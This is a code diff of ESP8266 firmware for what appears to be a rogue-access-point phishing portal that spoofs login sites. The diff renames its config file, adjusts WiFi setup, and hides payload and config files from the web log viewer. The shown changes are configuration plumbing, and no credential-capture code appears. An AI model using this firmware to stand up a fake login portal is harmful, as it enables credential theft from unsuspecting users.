@@ -363,13 +363,13 @@ bool loadDefaults() {
   json["site10_domain"] = "fakesite10.com";
   json["site10_redirect"] = "/login";
 */  json["site_other_redirect"] = "/user/login";
-  File configFile = SPIFFS.open("/config.json", "w");
+  File configFile = SPIFFS.open("/esportal.json", "w");
   json.printTo(configFile);
   loadConfig();
 }
 
 bool loadConfig() {
-  File configFile = SPIFFS.open("/config.json", "r");
+  File configFile = SPIFFS.open("/esportal.json", "r");
   if (!configFile) {
     loadDefaults();
   }
@@ -451,19 +451,21 @@ bool loadConfig() {
   Serial.println(gateway);
   Serial.println(subnet);
 */
-
+  WiFi.persistent(false);
+  //ESP.eraseConfig();
 // Determine if set to Access point mode
   if (accesspointmode == 1) {
-    ESP.eraseConfig();
     WiFi.disconnect(true);
     WiFi.mode(WIFI_AP);
-//    Serial.print("Setting up Network Configuration ... ");
-//    Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Success" : "Failed!");
-    WiFi.softAPConfig(local_IP, gateway, subnet);
 
 //    Serial.print("Starting Access Point ... ");
 //    Serial.println(WiFi.softAP(ssid, password, channel, hidden) ? "Success" : "Failed!");
     WiFi.softAP(ssid, password, channel, hidden);
+
+//    Serial.print("Setting up Network Configuration ... ");
+//    Serial.println(WiFi.softAPConfig(local_IP, gateway, subnet) ? "Success" : "Failed!");
+    WiFi.softAPConfig(local_IP, gateway, subnet);
+
 //    WiFi.reconnect();
 
 //    Serial.print("IP address = ");
@@ -471,7 +473,6 @@ bool loadConfig() {
   }
 // or Join existing network
   else if (accesspointmode != 1) {
-    ESP.eraseConfig();
     WiFi.disconnect(true);
     WiFi.mode(WIFI_STA);
 //    Serial.print("Setting up Network Configuration ... ");
@@ -533,7 +534,7 @@ bool saveConfig() {
   json["site10_redirect"] = site10_redirect;
 */  json["site_other_redirect"] = site_other_redirect;
 
-  File configFile = SPIFFS.open("/config.json", "w");
+  File configFile = SPIFFS.open("/esportal.json", "w");
   json.printTo(configFile);
   return true;
 }
@@ -558,7 +559,7 @@ void ListLogs(){
     String FileName = dir.fileName();
     File f = dir.openFile("r");
     FileList += " ";
-    if((!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/viewlog?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletelog?payload="+FileName+"\"><button>Delete File</button></td></tr>";
+    if((!FileName.startsWith("/payloads/"))&&(!FileName.startsWith("/esploit.json"))&&(!FileName.startsWith("/esportal.json"))&&(!FileName.startsWith("/config.json"))) FileList += "<tr><td><a href=\"/viewlog?payload="+FileName+"\">"+FileName+"</a></td>"+"<td>"+f.size()+"</td><td><a href=\""+FileName+"\"><button>Download File</button></td><td><a href=\"/deletelog?payload="+FileName+"\"><button>Delete File</button></td></tr>";
   }
   FileList += "</table>";
   server.send(200, "text/html", FileList);
